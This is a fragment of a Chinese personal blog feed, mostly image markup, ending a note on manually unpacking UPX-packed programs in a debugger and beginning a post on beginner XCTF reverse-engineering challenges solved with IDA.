		data-flex-basis=&#34;124px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025099-442787278.png&#34;
	width=&#34;306&#34;
	height=&#34;159&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025099-442787278_hu7286703434134373310.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025099-442787278_hu6681685352535875158.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;461px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们进行push入栈之后，在右侧寄存器里可以看到ESP有了操作，右键让其进入数据窗口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025353-1485175939.png&#34;
	width=&#34;576&#34;
	height=&#34;360&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025353-1485175939_hu8468560004010234697.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025353-1485175939_hu12213655147356224796.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;160&#34;
		data-flex-basis=&#34;384px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;也可以在下方指令框中输入 dd/hr ESP地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025631-151688006.png&#34;
	width=&#34;546&#34;
	height=&#34;162&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025631-151688006_hu8028472777060759381.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025631-151688006_hu3815281276637790448.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;808px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;设置硬件访问，word和Dword都可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025881-2081215009.png&#34;
	width=&#34;576&#34;
	height=&#34;406&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025881-2081215009_hu10573923827441252430.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232025881-2081215009_hu17179853977655407842.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;141&#34;
		data-flex-basis=&#34;340px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后运行一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026181-380409625.png&#34;
	width=&#34;550&#34;
	height=&#34;88&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026181-380409625_hu5269338958788553047.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026181-380409625_hu7345785403984041733.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;625&#34;
		data-flex-basis=&#34;1500px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;随后就和方法1一样继续往下走。&lt;/p&gt;
&lt;h1 id=&#34;方法3二次内存镜像法&#34;&gt;方法3：二次内存镜像法
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026467-1956779309.png&#34;
	width=&#34;576&#34;
	height=&#34;347&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026467-1956779309_hu10744946735280404995.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026467-1956779309_hu18071349960981388030.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;398px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以通过菜单栏&amp;quot;查看—内存&amp;quot;或直接按m进入内存界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026722-1213014504.png&#34;
	width=&#34;375&#34;
	height=&#34;367&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026722-1213014504_hu13485386866760452959.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026722-1213014504_hu1739572890187036437.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;102&#34;
		data-flex-basis=&#34;245px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;对区段&amp;quot;.rsrc&amp;quot;下断点，下面的区段不用管，之下第一个rsrc，后面的是系统的区段。&lt;/p&gt;
&lt;p&gt;下完之后运行走一步，然后回来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026989-1610571867.png&#34;
	width=&#34;355&#34;
	height=&#34;281&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026989-1610571867_hu15347044289315268897.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232026989-1610571867_hu9028093294329319504.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;回来之后在401000处再下一次&lt;/p&gt;
&lt;p&gt;随后单步往下走，同方法1&lt;/p&gt;
&lt;h1 id=&#34;方法4直捣黄龙适用于绝大部分的upx壳和部分aspack壳&#34;&gt;方法4：直捣黄龙（适用于绝大部分的UPX壳和部分Aspack壳）
&lt;/h1&gt;&lt;p&gt;众所周知，push的反义词是pop，有入栈的push，必定有出栈的pop&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027307-1651989000.png&#34;
	width=&#34;576&#34;
	height=&#34;406&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027307-1651989000_hu4851344994895100076.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027307-1651989000_hu2744408102484648894.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;141&#34;
		data-flex-basis=&#34;340px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们查找popad，因为是pushad所以后面的ad相同，注意不用勾选整个块，因为整个块的popad绝对不止一个。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027563-1080268248.png&#34;
	width=&#34;282&#34;
	height=&#34;84&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027563-1080268248_hu10177470908827701367.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027563-1080268248_hu6266732855600665292.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;335&#34;
		data-flex-basis=&#34;805px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;好，找到了，单步运行，同方法1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027767-604388203.png&#34;
	width=&#34;576&#34;
	height=&#34;69&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027767-604388203_hu10212756957321045220.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232027767-604388203_hu7297003849489512662.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;834&#34;
		data-flex-basis=&#34;2003px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2.1【欢乐向】攻防世界新手逆向刷题被虐哭日常记录</title>
        <link>https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Sat, 01 Feb 2020 13:50:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;h1 id=&#34;21欢乐向逆向刷题被虐哭日常记录&#34;&gt;2.1【欢乐向】逆向刷题被虐哭日常记录
&lt;/h1&gt;&lt;p&gt;前面好多题之前做了也没记录，懒得整了，直接从剩下的几个开始：&lt;/p&gt;
&lt;h1 id=&#34;getit&#34;&gt;Getit
&lt;/h1&gt;&lt;p&gt;这一段是解密的关键，后面的是把flag写入文档又给删了。&lt;/p&gt;
&lt;p&gt;其实可以修改程序逻辑让他别删， &lt;em&gt;但是我不会&lt;/em&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215008912-1404937321.png&#34;
	width=&#34;563&#34;
	height=&#34;602&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215008912-1404937321_hu72002671839688069.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215008912-1404937321_hu6787145862078822785.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;93&#34;
		data-flex-basis=&#34;224px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;逆着来推一边，不会写py，用c写个。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009376-248646515.png&#34;
	width=&#34;576&#34;
	height=&#34;303&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009376-248646515_hu7006502454449300443.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009376-248646515_hu2624479070640340232.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009647-1393044750.png&#34;
	width=&#34;576&#34;
	height=&#34;263&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009647-1393044750_hu6070974887372010547.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009647-1393044750_hu1859458460894488847.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;219&#34;
		data-flex-basis=&#34;525px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;？不应当，我大概是忘了加括号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009900-2042628758.png&#34;
	width=&#34;576&#34;
	height=&#34;322&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009900-2042628758_hu13247487104854209818.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215009900-2042628758_hu4470642973985927275.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;178&#34;
		data-flex-basis=&#34;429px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;？？？我觉得我的没啥问题，去网上查了查相关的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010127-1510435553.png&#34;
	width=&#34;162&#34;
	height=&#34;161&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010127-1510435553_hu5425621959270590230.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010127-1510435553_hu12811749537452106337.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;241px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在IDA里没看到有S，咱也不知道咋回事。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010357-1232752420.png&#34;
	width=&#34;576&#34;
	height=&#34;112&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010357-1232752420_hu16924262449000278919.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010357-1232752420_hu1380999167419022846.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;514&#34;
		data-flex-basis=&#34;1234px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;no-strings-attached&#34;&gt;no-strings-attached
&lt;/h1&gt;&lt;p&gt;直接扔IDA瞅瞅：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010586-438035929.png&#34;
	width=&#34;508&#34;
	height=&#34;164&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010586-438035929_hu1699684010146623977.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010586-438035929_hu17177293344051130906.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;743px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;挨个函数筛，筛出最后一个有、东西。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010800-573591045.png&#34;
	width=&#34;322&#34;
	height=&#34;288&#34;
